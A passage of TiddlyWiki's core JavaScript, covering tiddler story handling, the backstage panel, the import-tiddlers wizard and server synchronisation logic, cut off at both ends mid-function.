	var e = null;
	if(tiddlerElem != null) {
		var children = tiddlerElem.getElementsByTagName("*");
		for(var t=0; t<children.length; t++) {
			var c = children[t];
			if(c.tagName.toLowerCase() == "input" || c.tagName.toLowerCase() == "textarea") {
				if(!e)
					e = c;
				if(c.getAttribute("edit") == field)
					e = c;
			}
		}
	}
	return e;
};

Story.prototype.focusTiddler = function(title,field)
{
	var e = this.getTiddlerField(title,field);
	if(e) {
		e.focus();
		e.select();
	}
};

Story.prototype.blurTiddler = function(title)
{
	var tiddlerElem = document.getElementById(this.idPrefix + title);
	if(tiddlerElem != null && tiddlerElem.focus && tiddlerElem.blur) {
		tiddlerElem.focus();
		tiddlerElem.blur();
	}
};

Story.prototype.setTiddlerField = function(title,tag,mode,field)
{
	var c = story.getTiddlerField(title,field);

	var tags = c.value.readBracketedList();
	tags.setItem(tag,mode);
	c.value = String.encodeTiddlyLinkList(tags);
};

Story.prototype.setTiddlerTag = function(title,tag,mode)
{
	Story.prototype.setTiddlerField(title,tag,mode,"tags");
};

Story.prototype.closeTiddler = function(title,animate,unused)
{
	var tiddlerElem = document.getElementById(this.idPrefix + title);
	if(tiddlerElem != null) {
		clearMessage();
		this.scrubTiddler(tiddlerElem);
		if(config.options.chkAnimate && animate && anim && typeof Slider == "function")
			anim.startAnimating(new Slider(tiddlerElem,false,null,"all"));
		else {
			removeNode(tiddlerElem);
			forceReflow();
		}
	}
};

Story.prototype.scrubTiddler = function(tiddlerElem)
{
	tiddlerElem.id = null;
};

Story.prototype.setDirty = function(title,dirty)
{
	var tiddlerElem = document.getElementById(this.idPrefix + title);
	if(tiddlerElem != null)
		tiddlerElem.setAttribute("dirty",dirty ? "true" : "false");
};

Story.prototype.isDirty = function(title)
{
	var tiddlerElem = document.getElementById(this.idPrefix + title);
	if(tiddlerElem != null)
		return tiddlerElem.getAttribute("dirty") == "true";
	return null;
};

Story.prototype.areAnyDirty = function()
{
	var r = false;
	this.forEachTiddler(function(title,element) {
		if(this.isDirty(title))
			r = true;
	});
	return r;
};

Story.prototype.closeAllTiddlers = function(exclude)
{
	clearMessage();
	this.forEachTiddler(function(title,element) {
		if((title != exclude) && element.getAttribute("dirty") != "true")
			this.closeTiddler(title);
	});
	window.scrollTo(0,ensureVisible(this.container));
};

Story.prototype.isEmpty = function()
{
	var place = document.getElementById(this.container);
	return place && place.firstChild == null;
};

Story.prototype.search = function(text,useCaseSensitive,useRegExp)
{
	this.closeAllTiddlers();
	highlightHack = new RegExp(useRegExp ?	 text : text.escapeRegExp(),useCaseSensitive ? "mg" : "img");
	var matches = store.search(highlightHack,"title","excludeSearch");
	var titles = [];
	for(var t=0;t<matches.length;t++)
		titles.push(matches[t].title);
	this.displayTiddlers(null,titles);
	highlightHack = null;
	var q = useRegExp ? "/" : "'";
	if(matches.length > 0)
		displayMessage(config.macros.search.successMsg.format([titles.length.toString(),q + text + q]));
	else
		displayMessage(config.macros.search.failureMsg.format([q + text + q]));
};

Story.prototype.findContainingTiddler = function(e)
{
	while(e && !hasClass(e,"tiddler"))
		e = e.parentNode;
	return e;
};

Story.prototype.gatherSaveFields = function(e,fields)
{
	if(e && e.getAttribute) {
		var f = e.getAttribute("edit");
		if(f)
			fields[f] = e.value.replace(/\r/mg,"");
		if(e.hasChildNodes()) {
			var c = e.childNodes;
			for(var t=0; t<c.length; t++)
				this.gatherSaveFields(c[t],fields);
		}
	}
};

Story.prototype.hasChanges = function(title)
{
	var e = document.getElementById(this.idPrefix + title);
	if(e != null) {
		var fields = {};
		this.gatherSaveFields(e,fields);
		var tiddler = store.fetchTiddler(title);
		if(!tiddler)
			return false;
		for(var n in fields) {
			if(store.getValue(title,n) != fields[n])
				return true;
		}
	}
	return false;
};

Story.prototype.saveTiddler = function(title,minorUpdate)
{
	var tiddlerElem = document.getElementById(this.idPrefix + title);
	if(tiddlerElem != null) {
		var fields = {};
		this.gatherSaveFields(tiddlerElem,fields);
		var newTitle = fields.title ? fields.title : title;
		if(store.tiddlerExists(newTitle) && newTitle != title) {
			if(!confirm(config.messages.overwriteWarning.format([newTitle.toString()])))
				return null;
		}
		if(newTitle != title)
			this.closeTiddler(newTitle,false);
		tiddlerElem.id = this.idPrefix + newTitle;
		tiddlerElem.setAttribute("tiddler",newTitle);
		tiddlerElem.setAttribute("template",DEFAULT_VIEW_TEMPLATE);
		tiddlerElem.setAttribute("dirty","false");
		if(config.options.chkForceMinorUpdate)
			minorUpdate = !minorUpdate;
		if(!store.tiddlerExists(newTitle))
			minorUpdate = false;
		var newDate = new Date();
		var extendedFields = store.tiddlerExists(newTitle) ? store.fetchTiddler(newTitle).fields : {};
		for(var n in fields) {
			if(!TiddlyWiki.isStandardField(n))
				extendedFields[n] = fields[n];
			}
		var tiddler = store.saveTiddler(title,newTitle,fields.text,minorUpdate ? undefined : config.options.txtUserName,minorUpdate ? undefined : newDate,fields.tags,extendedFields);
		autoSaveChanges(null,[tiddler]);
		return newTitle;
	}
	return null;
};

Story.prototype.permaView = function()
{
	var links = [];
	this.forEachTiddler(function(title,element) {
		links.push(String.encodeTiddlyLink(title));
	});
	var t = encodeURIComponent(links.join(" "));
	if(t == "")
		t = "#";
	if(window.location.hash != t)
		window.location.hash = t;
};

//--
//-- Backstage
//--

var backstage = {
	area: null,
	toolbar: null,
	button: null,
	showButton: null,
	hideButton: null,
	cloak: null,
	panel: null,
	panelBody: null,
	panelFooter: null,
	currTabName: null,
	currTabElem: null,
	content: null,

	init: function() {
		var cmb = config.messages.backstage;
		this.area = document.getElementById("backstageArea");
		this.toolbar = document.getElementById("backstageToolbar");
		this.button = document.getElementById("backstageButton");
		this.button.style.display = "block";
		var t = cmb.open.text + " " + glyph("bentArrowLeft");
		this.showButton = createTiddlyButton(this.button,t,cmb.open.tooltip,
						function (e) {backstage.show(); return false;},null,"backstageShow");
		t = glyph("bentArrowRight") + " " + cmb.close.text;
		this.hideButton = createTiddlyButton(this.button,t,cmb.close.tooltip,
						function (e) {backstage.hide(); return false;},null,"backstageHide");
		this.cloak = document.getElementById("backstageCloak");
		this.panel = document.getElementById("backstagePanel");
		this.panelFooter = createTiddlyElement(this.panel,"div",null,"backstagePanelFooter");
		this.panelBody = createTiddlyElement(this.panel,"div",null,"backstagePanelBody");
		this.cloak.onmousedown = function(e) {
			backstage.switchTab(null);
		};
		createTiddlyText(this.toolbar,cmb.prompt);
		for(t=0; t<config.backstageTasks.length; t++) {
			var taskName = config.backstageTasks[t];
			var task = config.tasks[taskName];
			var handler = task.action ? this.onClickCommand : this.onClickTab;
			var text = task.text + (task.action ? "" : glyph("downTriangle"));
			var btn = createTiddlyButton(this.toolbar,text,task.tooltip,handler,"backstageTab");
			btn.setAttribute("task",taskName);
			addClass(btn,task.action ? "backstageAction" : "backstageTask");
			}
		this.content = document.getElementById("contentWrapper");
		if(config.options.chkBackstage)
			this.show();
		else
			this.hide();
	},
	
	isVisible: function () {
		return this.area ? this.area.style.display == "block" : false;
	},
	
	show: function() {
		this.area.style.display = "block";
		if(anim && config.options.chkAnimate) {
			backstage.toolbar.style.left = findWindowWidth() + "px";
			var p = [
				{style: "left", start: findWindowWidth(), end: 0, template: "%0px"}
			];
			anim.startAnimating(new Morpher(backstage.toolbar,config.animDuration,p));
		} else {
			backstage.area.style.left = "0px";
		}
		this.showButton.style.display = "none";
		this.hideButton.style.display = "block";
		config.options.chkBackstage = true;
		saveOptionCookie("chkBackstage");
		addClass(this.content,"backstageVisible");
	},

	hide: function() {
		if(this.currTabElem) {
			this.switchTab(null);
		} else {
			backstage.toolbar.style.left = "0px";
			if(anim && config.options.chkAnimate) {
				var p = [
					{style: "left", start: 0, end: findWindowWidth(), template: "%0px"}
				];
				var c = function(element,properties) {backstage.area.style.display = "none";};
				anim.startAnimating(new Morpher(backstage.toolbar,config.animDuration,p,c));
			} else {
				this.area.style.display = "none";
			}
			this.showButton.style.display = "block";
			this.hideButton.style.display = "none";
			config.options.chkBackstage = false;
			saveOptionCookie("chkBackstage");
			removeClass(this.content,"backstageVisible");
		}
	},

	onClickCommand: function(e) {
		var task = config.tasks[this.getAttribute("task")];
		displayMessage(task);
		if(task.action) {
			backstage.switchTab(null);
			task.action();
		}
		return false;
	},

	onClickTab: function(e) {
		backstage.switchTab(this.getAttribute("task"));
		return false;
	},

	// Switch to a given tab, or none if null is passed
	switchTab: function(tabName) {
		var tabElem = null;
		var e = this.toolbar.firstChild;
		while(e)
			{
			if(e.getAttribute && e.getAttribute("task") == tabName)
				tabElem = e;
			e = e.nextSibling;
			}
		if(tabName == backstage.currTabName)
			return;
		if(backstage.currTabElem) {
			removeClass(this.currTabElem,"backstageSelTab");
		}
		if(tabElem && tabName) {
			backstage.preparePanel();
			addClass(tabElem,"backstageSelTab");
			var task = config.tasks[tabName];
			wikify(task.content,backstage.panelBody,null,null);
			backstage.showPanel();
		} else if(backstage.currTabElem) {
			backstage.hidePanel();
		}
		backstage.currTabName = tabName;
		backstage.currTabElem = tabElem;
	},

	isPanelVisible: function() {
		return backstage.panel ? backstage.panel.style.display == "block" : false;
	},

	preparePanel: function() {
		backstage.cloak.style.height = findWindowHeight() + "px";
		backstage.cloak.style.display = "block";
		removeChildren(backstage.panelBody);
		return backstage.panelBody;
	},
	
	showPanel: function() {
		backstage.panel.style.display = "block";
		if(anim && config.options.chkAnimate) {
			backstage.panel.style.top = (-backstage.panel.offsetHeight) + "px";
			var p = [
				{style: "top", start: -backstage.panel.offsetHeight, end: 0, template: "%0px"}
			];
			anim.startAnimating(new Morpher(backstage.panel,config.animDuration,p),new Scroller(backstage.panel,false));
		} else {
			backstage.panel.style.top = "0px";
		}
		return backstage.panelBody;
	},
	
	hidePanel: function() {
		backstage.currTabName = null;
		backstage.currTabElem = null;
		if(anim && config.options.chkAnimate) {
			var p = [
				{style: "top", start: 0, end: -(backstage.panel.offsetHeight), template: "%0px"},
				{style: "display", atEnd: "none"}
			];
			var c = function(element,properties) {backstage.cloak.style.display = "none";};
			anim.startAnimating(new Morpher(backstage.panel,config.animDuration,p,c));
		 } else {
			backstage.panel.style.display = "none";
			backstage.cloak.style.display = "none";
		}
	}
};

config.macros.backstage = {};

config.macros.backstage.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	var backstageTask = config.tasks[params[0]];
	if(backstageTask)
		createTiddlyButton(place,backstageTask.text,backstageTask.tooltip,function(e) {backstage.switchTab(params[0]); return false;});
};

//--
//-- ImportTiddlers macro
//--

config.macros.importTiddlers.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	if(readOnly) {
		createTiddlyElement(place,"div",null,"marked",this.readOnlyWarning);
		return;
	}
	var w = new Wizard();
	w.createWizard(place,this.wizardTitle);
	this.restart(w);
};

config.macros.importTiddlers.onCancel = function(e)
{
	var wizard = new Wizard(this);
	var place = wizard.clear();
	config.macros.importTiddlers.restart(wizard);
	return false;
};

config.macros.importTiddlers.restart = function(wizard)
{
	wizard.addStep(this.step1Title,this.step1Html);
	var s = wizard.getElement("selTypes");
	for(var t in config.adaptors) {
		var e = createTiddlyElement(s,"option",null,null,t);
		e.value = t;
	}
	s = wizard.getElement("selFeeds");
	var feeds = this.getFeeds();
	for(t in feeds) {
		e = createTiddlyElement(s,"option",null,null,t);
		e.value = t;
	}
	wizard.setValue("feeds",feeds);
	s.onchange = config.macros.importTiddlers.onFeedChange;
	var fileInput = wizard.getElement("txtBrowse");
	fileInput.onchange = config.macros.importTiddlers.onBrowseChange;
	fileInput.onkeyup = config.macros.importTiddlers.onBrowseChange;
	wizard.setButtons([{caption: this.openLabel, tooltip: this.openPrompt, onClick: config.macros.importTiddlers.onOpen}]);
};

config.macros.importTiddlers.getFeeds = function()
{
	var feeds = {};
	var tagged = store.getTaggedTiddlers("systemServer","title");
	for(var t=0; t<tagged.length; t++) {
		var title = tagged[t].title;
		var serverType = store.getTiddlerSlice(title,"Type");
		if(!serverType)
			serverType = "file";
		feeds[title] = {title: title,
						url: store.getTiddlerSlice(title,"URL"),
						workspace: store.getTiddlerSlice(title,"Workspace"),
						workspaceList: store.getTiddlerSlice(title,"WorkspaceList"),
						tiddlerFilter: store.getTiddlerSlice(title,"TiddlerFilter"),
						serverType: serverType,
						description: store.getTiddlerSlice(title,"Description")};
	}
	return feeds;
};

config.macros.importTiddlers.onFeedChange = function(e)
{
	var wizard = new Wizard(this);
	var selTypes = wizard.getElement("selTypes");
	var fileInput = wizard.getElement("txtPath");
	var feeds = wizard.getValue("feeds");
	var f = feeds[this.value];
	if(f) {
		selTypes.value = f.serverType;
		fileInput.value = f.url;
		this.selectedIndex = 0;
		wizard.setValue("feedName",f.serverType);
		wizard.setValue("feedHost",f.url);
		wizard.setValue("feedWorkspace",f.workspace);
		wizard.setValue("feedWorkspaceList",f.workspaceList);
		wizard.setValue("feedTiddlerFilter",f.tiddlerFilter);
	}
	return false;
};

config.macros.importTiddlers.onBrowseChange = function(e)
{
	var wizard = new Wizard(this);
	var fileInput = wizard.getElement("txtPath");
	fileInput.value = "file://" + this.value;
	var serverType = wizard.getElement("selTypes");
	serverType.value = "file";
	return false;
};

config.macros.importTiddlers.onOpen = function(e)
{
	var wizard = new Wizard(this);
	var fileInput = wizard.getElement("txtPath");
	var url = fileInput.value;
	var serverType = wizard.getElement("selTypes").value;
	var adaptor = new config.adaptors[serverType];
	wizard.setValue("adaptor",adaptor);
	wizard.setValue("serverType",serverType);
	wizard.setValue("host",url);
	var context = {};
	var ret = adaptor.openHost(url,context,wizard,config.macros.importTiddlers.onOpenHost);
	if(ret !== true)
		displayMessage(ret);
	wizard.setButtons([{caption: config.macros.importTiddlers.cancelLabel, tooltip: config.macros.importTiddlers.cancelPrompt, onClick: config.macros.importTiddlers.onCancel}],config.macros.importTiddlers.statusOpenHost);
	return false;
};

config.macros.importTiddlers.onOpenHost = function(context,wizard)
{
	var adaptor = wizard.getValue("adaptor");
	if(context.status !== true)
		displayMessage("Error in importTiddlers.onOpenHost: " + context.statusText);
	var ret = adaptor.getWorkspaceList(context,wizard,config.macros.importTiddlers.onGetWorkspaceList);
	if(ret !== true)
		displayMessage(ret);
	wizard.setButtons([{caption: config.macros.importTiddlers.cancelLabel, tooltip: config.macros.importTiddlers.cancelPrompt, onClick: config.macros.importTiddlers.onCancel}],config.macros.importTiddlers.statusGetWorkspaceList);
};

config.macros.importTiddlers.onGetWorkspaceList = function(context,wizard)
{
	if(context.status !== true)
		displayMessage("Error in importTiddlers.onGetWorkspaceList: " + context.statusText);
	wizard.addStep(config.macros.importTiddlers.step2Title,config.macros.importTiddlers.step2Html);
	var s = wizard.getElement("selWorkspace");
	s.onchange = config.macros.importTiddlers.onWorkspaceChange;
	for(var t=0; t<context.workspaces.length; t++) {
		var e = createTiddlyElement(s,"option",null,null,context.workspaces[t].title);
		e.value = context.workspaces[t].title;
	}
	var workspaceList = wizard.getValue("feedWorkspaceList");
	if(workspaceList) {
		var list = workspaceList.parseParams("workspace",null,false,true);
		for(var n=1; n<list.length; n++) {
			if(context.workspaces.findByField("title",list[n].value) == null) {
				e = createTiddlyElement(s,"option",null,null,list[n].value);
				e.value = list[n].value;
			}
		}
	}
	var workspace = wizard.getValue("feedWorkspace");
	if(workspace) {
		t = wizard.getElement("txtWorkspace");
		t.value = workspace;
	}
	wizard.setButtons([{caption: config.macros.importTiddlers.openLabel, tooltip: config.macros.importTiddlers.openPrompt, onClick: config.macros.importTiddlers.onChooseWorkspace}]);
};

config.macros.importTiddlers.onWorkspaceChange = function(e)
{
	var wizard = new Wizard(this);
	var t = wizard.getElement("txtWorkspace");
	t.value  = this.value;
	this.selectedIndex = 0;
	return false;
};

config.macros.importTiddlers.onChooseWorkspace = function(e)
{
	var wizard = new Wizard(this);
	var adaptor = wizard.getValue("adaptor");
	var workspace = wizard.getElement("txtWorkspace").value;
	wizard.setValue("workspace",workspace);
	var context = {};
	var ret = adaptor.openWorkspace(workspace,context,wizard,config.macros.importTiddlers.onOpenWorkspace);
	if(ret !== true)
		displayMessage(ret);
	wizard.setButtons([{caption: config.macros.importTiddlers.cancelLabel, tooltip: config.macros.importTiddlers.cancelPrompt, onClick: config.macros.importTiddlers.onCancel}],config.macros.importTiddlers.statusOpenWorkspace);
	return false;
};

config.macros.importTiddlers.onOpenWorkspace = function(context,wizard)
{
	if(context.status !== true)
		displayMessage("Error in importTiddlers.onOpenWorkspace: " + context.statusText);
	var adaptor = wizard.getValue("adaptor");
	var ret = adaptor.getTiddlerList(context,wizard,config.macros.importTiddlers.onGetTiddlerList,wizard.getValue("feedTiddlerFilter"));
	if(ret !== true)
		displayMessage(ret);
	wizard.setButtons([{caption: config.macros.importTiddlers.cancelLabel, tooltip: config.macros.importTiddlers.cancelPrompt, onClick: config.macros.importTiddlers.onCancel}],config.macros.importTiddlers.statusGetTiddlerList);
};

config.macros.importTiddlers.onGetTiddlerList = function(context,wizard)
{
	if(context.status !== true)
		displayMessage("Error in importTiddlers.onGetTiddlerList: " + context.statusText);
	// Extract data for the listview
	var listedTiddlers = [];
	if(context.tiddlers) {
		for(var n=0; n<context.tiddlers.length; n++) {
			var tiddler = context.tiddlers[n];
			listedTiddlers.push({
				title: tiddler.title,
				modified: tiddler.modified,
				modifier: tiddler.modifier,
				text: tiddler.text ? wikifyPlainText(tiddler.text,100) : "",
				tags: tiddler.tags,
				size: tiddler.text ? tiddler.text.length : 0,
				tiddler: tiddler
			});
		}
	}
	listedTiddlers.sort(function(a,b) {return a.title < b.title ? -1 : (a.title == b.title ? 0 : +1);});
	// Display the listview
	wizard.addStep(config.macros.importTiddlers.step3Title,config.macros.importTiddlers.step3Html);
	var markList = wizard.getElement("markList");
	var listWrapper = document.createElement("div");
	markList.parentNode.insertBefore(listWrapper,markList);
	var listView = ListView.create(listWrapper,listedTiddlers,config.macros.importTiddlers.listViewTemplate);
	wizard.setValue("listView",listView);
	var txtSaveTiddler = wizard.getElement("txtSaveTiddler");
	txtSaveTiddler.value = config.macros.importTiddlers.generateSystemServerName(wizard);
	wizard.setButtons([
			{caption: config.macros.importTiddlers.cancelLabel, tooltip: config.macros.importTiddlers.cancelPrompt, onClick: config.macros.importTiddlers.onCancel},
			{caption: config.macros.importTiddlers.importLabel, tooltip: config.macros.importTiddlers.importPrompt, onClick:  config.macros.importTiddlers.doImport}
		]);
};

config.macros.importTiddlers.generateSystemServerName = function(wizard)
{
	var serverType = wizard.getValue("serverType");
	var host = wizard.getValue("host");
	var workspace = wizard.getValue("workspace");
	var pattern = config.macros.importTiddlers[workspace ? "systemServerNamePattern" : "systemServerNamePatternNoWorkspace"];
	return pattern.format([serverType,host,workspace]);
};

config.macros.importTiddlers.saveServerTiddler = function(wizard)
{
	var txtSaveTiddler = wizard.getElement("txtSaveTiddler").value;
	if(store.tiddlerExists(txtSaveTiddler)) {
		if(!confirm(config.macros.importTiddlers.confirmOverwriteSaveTiddler.format([txtSaveTiddler])))
			return;
		store.suspendNotifications();
		store.removeTiddler(txtSaveTiddler);
		store.resumeNotifications();
	}
	var serverType = wizard.getValue("serverType");
	var host = wizard.getValue("host");
	var workspace = wizard.getValue("workspace");
	var text = config.macros.importTiddlers.serverSaveTemplate.format([serverType,host,workspace]);
	store.saveTiddler(txtSaveTiddler,txtSaveTiddler,text,config.macros.importTiddlers.serverSaveModifier,new Date(),["systemServer"]);
};

config.macros.importTiddlers.doImport = function(e)
{
	var wizard = new Wizard(this);
	if(wizard.getElement("chkSave").checked)
		config.macros.importTiddlers.saveServerTiddler(wizard);
	var chkSync = wizard.getElement("chkSync").checked;
	wizard.setValue("sync",chkSync);
	var listView = wizard.getValue("listView");
	var rowNames = ListView.getSelectedRows(listView);
	var adaptor = wizard.getValue("adaptor");
	var overwrite = new Array();
	var t;
	for(t=0; t<rowNames.length; t++) {
		if(store.tiddlerExists(rowNames[t]))
			overwrite.push(rowNames[t]);
	}
	if(overwrite.length > 0) {
		if(!confirm(config.macros.importTiddlers.confirmOverwriteText.format([overwrite.join(", ")])))
			return false;
	}
	wizard.addStep(config.macros.importTiddlers.step4Title.format([rowNames.length]),config.macros.importTiddlers.step4Html);
	for(t=0; t<rowNames.length; t++) {
		var link = document.createElement("div");
		createTiddlyLink(link,rowNames[t],true);
		var place = wizard.getElement("markReport");
		place.parentNode.insertBefore(link,place);
	}
	wizard.setValue("remainingImports",rowNames.length);
	wizard.setButtons([
			{caption: config.macros.importTiddlers.cancelLabel, tooltip: config.macros.importTiddlers.cancelPrompt, onClick: config.macros.importTiddlers.onCancel}
		],config.macros.importTiddlers.statusDoingImport);
	for(t=0; t<rowNames.length; t++) {
		var context = {};
		context.allowSynchronous = true;
		var inbound = adaptor.getTiddler(rowNames[t],context,wizard,config.macros.importTiddlers.onGetTiddler);
	}
	return false;
};

config.macros.importTiddlers.onGetTiddler = function(context,wizard)
{
	if(!context.status)
		displayMessage("Error in importTiddlers.onGetTiddler: " + context.statusText);
	var tiddler = context.tiddler;
	store.suspendNotifications();
	store.saveTiddler(tiddler.title, tiddler.title, tiddler.text, tiddler.modifier, tiddler.modified, tiddler.tags, tiddler.fields, true, tiddler.created);
	if(!wizard.getValue("sync")) {
		store.setValue(tiddler.title,'server',null);
	}
	store.resumeNotifications();
	if(!context.isSynchronous) 
		store.notify(tiddler.title,true);
	var remainingImports = wizard.getValue("remainingImports")-1;
	wizard.setValue("remainingImports",remainingImports);
	if(remainingImports == 0) {
		if(context.isSynchronous) {
			store.notifyAll();
			refreshDisplay();
		}
		wizard.setButtons([
				{caption: config.macros.importTiddlers.doneLabel, tooltip: config.macros.importTiddlers.donePrompt, onClick: config.macros.importTiddlers.onCancel}
			],config.macros.importTiddlers.statusDoneImport);
		autoSaveChanges();
	}
};

//--
//-- Sync macro
//--

// Synchronisation handlers
config.syncers = {};

// Sync state.
var currSync = null;

// sync macro
config.macros.sync.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	if(!wikifier.isStatic)
		this.startSync(place);
};

config.macros.sync.startSync = function(place)
{
	if(currSync)
		config.macros.sync.cancelSync();
	currSync = {};
	currSync.syncList = this.getSyncableTiddlers();
	this.createSyncTasks();
	this.preProcessSyncableTiddlers();
	var wizard = new Wizard();
	currSync.wizard = wizard;
	wizard.createWizard(place,this.wizardTitle);
	wizard.addStep(this.step1Title,this.step1Html);
	var markList = wizard.getElement("markList");
	var listWrapper = document.createElement("div");
	markList.parentNode.insertBefore(listWrapper,markList);
	currSync.listView = ListView.create(listWrapper,currSync.syncList,this.listViewTemplate);
	this.processSyncableTiddlers();
	wizard.setButtons([
			{caption: this.syncLabel, tooltip: this.syncPrompt, onClick: this.doSync}
		]);
};

config.macros.sync.getSyncableTiddlers = function ()
{
	var list = [];
	store.forEachTiddler(function(title,tiddler) {
		var syncItem = {};
		syncItem.serverType = tiddler.getServerType();
		syncItem.serverHost = tiddler.fields['server.host'];
		syncItem.serverWorkspace = tiddler.fields['server.workspace'];
		syncItem.tiddler = tiddler;
		syncItem.title = tiddler.title;
		syncItem.isTouched = tiddler.isTouched();
		syncItem.selected = syncItem.isTouched;
		syncItem.syncStatus = config.macros.sync.syncStatusList[syncItem.isTouched ? "changedLocally" : "none"];
		syncItem.status = syncItem.syncStatus.text;
		if(syncItem.serverType && syncItem.serverHost)
			list.push(syncItem);
		});
	list.sort(function(a,b) {return a.title < b.title ? -1 : (a.title == b.title ? 0 : +1);});
	return list;
};

config.macros.sync.preProcessSyncableTiddlers = function()
{
	for(var t=0; t<currSync.syncList.length; t++) {
		si = currSync.syncList[t];
		var ti = si.syncTask.syncMachine.generateTiddlerInfo(si.tiddler);
		si.serverUrl = ti.uri;
	}
};

config.macros.sync.processSyncableTiddlers = function()
{
	for(var t=0; t<currSync.syncList.length; t++) {
		si = currSync.syncList[t];
		si.rowElement.style.backgroundColor = si.syncStatus.color;
	}
};

config.macros.sync.createSyncTasks = function()
{
	currSync.syncTasks = [];
	for(var t=0; t<currSync.syncList.length; t++) {
		var si = currSync.syncList[t];
		var r = null;
		for(var st=0; st<currSync.syncTasks.length; st++) {
			var cst = currSync.syncTasks[st];
			if(si.serverType == cst.serverType && si.serverHost == cst.serverHost && si.serverWorkspace == cst.serverWorkspace)
				r = cst;
		}
		if(r == null) {
			si.syncTask = this.createSyncTask(si);
			currSync.syncTasks.push(si.syncTask);
		} else {
			si.syncTask = r;
			r.syncItems.push(si);
		}
	}
};

config.macros.sync.createSyncTask = function(syncItem)
{
	var st = {};
	st.serverType = syncItem.serverType;
	st.serverHost = syncItem.serverHost;
	st.serverWorkspace = syncItem.serverWorkspace;
	st.syncItems = [syncItem];
	st.syncMachine = new SyncMachine(st.serverType,{
		start: function() {
			return this.openHost(st.serverHost,"openWorkspace");
		},
		openWorkspace: function() {
			return this.openWorkspace(st.serverWorkspace,"getTiddlerList");
		},
		getTiddlerList: function() {
			return this.getTiddlerList("gotTiddlerList");
		},
		gotTiddlerList: function(tiddlers) {
			for(var t=0; t<st.syncItems.length; t++) {
				var si = st.syncItems[t];
				var f = tiddlers.findByField("title",si.title);
				if(f !== null) {
					if(tiddlers[f].fields['server.page.revision'] > si.tiddler.fields['server.page.revision']) {
						si.syncStatus = config.macros.sync.syncStatusList[si.isTouched ? 'changedBoth' : 'changedServer'];
					}
				} else {
					si.syncStatus = config.macros.sync.syncStatusList.notFound;
				}
				config.macros.sync.updateSyncStatus(si);
			}
		},
		getTiddler: function(title) {
			return this.getTiddler(title,"onGetTiddler");
		},
		onGetTiddler: function(tiddler) {
			var syncItem = st.syncItems.findByField("title",tiddler.title);
			if(syncItem !== null) {
				syncItem = st.syncItems[syncItem];
				store.saveTiddler(tiddler.title, tiddler.title, tiddler.text, tiddler.modifier, tiddler.modified, tiddler.tags, tiddler.fields, true, tiddler.created);
				syncItem.syncStatus = config.macros.sync.syncStatusList.gotFromServer;
				config.macros.sync.updateSyncStatus(syncItem);
			}
		},
		putTiddler: function(tiddler) {
			return this.putTiddler(tiddler,"onPutTiddler");
		},
		onPutTiddler: function(tiddler) {
			var syncItem = st.syncItems.findByField("title",tiddler.title);
			if(syncItem !== null) {
				syncItem = st.syncItems[syncItem];
				store.resetTiddler(tiddler.title);
				syncItem.syncStatus = config.macros.sync.syncStatusList.putToServer;
				config.macros.sync.updateSyncStatus(syncItem);
			}
		}
	});
	st.syncMachine.go();
	return st;
};

config.macros.sync.updateSyncStatus = function(syncItem)
{
	var e = syncItem.colElements["status"];
	removeChildren(e);
	createTiddlyText(e,syncItem.syncStatus.text);
	syncItem.rowElement.style.backgroundColor = syncItem.syncStatus.color;
};

config.macros.sync.doSync = function(e)
{
	var rowNames = ListView.getSelectedRows(currSync.listView);
	for(var t=0; t<currSync.syncList.length; t++) {
		var si = currSync.syncList[t];
		if(rowNames.indexOf(si.title) != -1) {
			config.macros.sync.doSyncItem(si);
		}
	}
	return false;
};

config.macros.sync.doSyncItem = function(syncItem)
{
	var r = true;
	var sl = config.macros.sync.syncStatusList;
	switch(syncItem.syncStatus) {
		case sl.changedServer:
			r = syncItem.syncTask.syncMachine.go("getTiddler",syncItem.title);
			break;
		case sl.notFound:
		case sl.changedLocally:
		case sl.changedBoth:
			r = syncItem.syncTask.syncMachine.go("putTiddler",syncItem.tiddler);
			break;
		default:
			break;
	}
	if(r !== true)
		displayMessage("Error in doSyncItem: " + r);
};

config.macros.sync.cancelSync = function()
{
	currSync = null;
};

function SyncMachine(serverType,steps)
{
	this.serverType = serverType;
	this.adaptor = new config.adaptors[serverType];
	this.steps = steps;
}

SyncMachine.prototype.go = function(step,varargs)
{
	if(!step)
		step = "start";
	var h = this.steps[step];
	if(!h)
		return null;
	var a = [];
	for(var t=1; t<arguments.length; t++)
		a.push(arguments[t]);
	var r = h.apply(this,a);
	if(typeof r == "string")
		this.invokeError(r);
	return r;
};

SyncMachine.prototype.invokeError = function(message)
{
	if(this.steps.error)
		this.steps.error(message);
};

SyncMachine.prototype.openHost = function(host,nextStep)
{
	var me = this;
	return me.adaptor.openHost(host,null,null,function(context) {
		if(typeof context.status == "string")
			me.invokeError(context.status);
		else
			me.go(nextStep);
	});
};

SyncMachine.prototype.getWorkspaceList = function(nextStep)
{
	var me = this;
	return me.adaptor.getWorkspaceList(null,null,function(context) {
		if(typeof context.status == "string")
			me.invokeError(context.status);
		else
			me.go(nextStep,context.workspaces);
	});
};

SyncMachine.prototype.openWorkspace = function(workspace,nextStep)
{
	var me = this;
	return me.adaptor.openWorkspace(workspace,null,null,function(context) {
		if(typeof context.status == "string")
			me.invokeError(context.status);
		else
			me.go(nextStep);
	});
};

SyncMachine.prototype.getTiddlerList = function(nextStep)
{
	var me = this;
	return me.adaptor.getTiddlerList(null,null,function(context) {
		if(typeof context.status == "string")
			me.invokeError(context.status);
		else
			me.go(nextStep,context.tiddlers);
	});
};

SyncMachine.prototype.generateTiddlerInfo = function(tiddler)
{
	return this.adaptor.generateTiddlerInfo(tiddler);
};

SyncMachine.prototype.getTiddler = function(title,nextStep)
{
	var me = this;
	return me.adaptor.getTiddler(title,null,null,function(context) {
		if(typeof context.status == "string")
			me.invokeError(context.status);
		else
			me.go(nextStep,context.tiddler);
	});
};

SyncMachine.prototype.putTiddler = function(tiddler,nextStep)
{
	var me = this;
	return me.adaptor.putTiddler(tiddler,null,null,function(context) {
		if(typeof context.status == "string")
			me.invokeError(context.status);
		else
			me.go(nextStep,tiddler);
	});
};

//--
//-- Manager UI for groups of tiddlers
//--

config.macros.plugins.handler = function(place,macroName,params,wikifier,paramString,tiddler)
{
	var wizard = new Wizard();
	wizard.createWizard(place,this.wizardTitle);
	wizard.addStep(this.step1Title,this.step1Html);
	var markList = wizard.getElement("markList");
	var listWrapper = document.createElement("div");
	markList.parentNode.insertBefore(listWrapper,markList);
	listWrapper.setAttribute("refresh","macro");
	listWrapper.setAttribute("macroName","plugins");
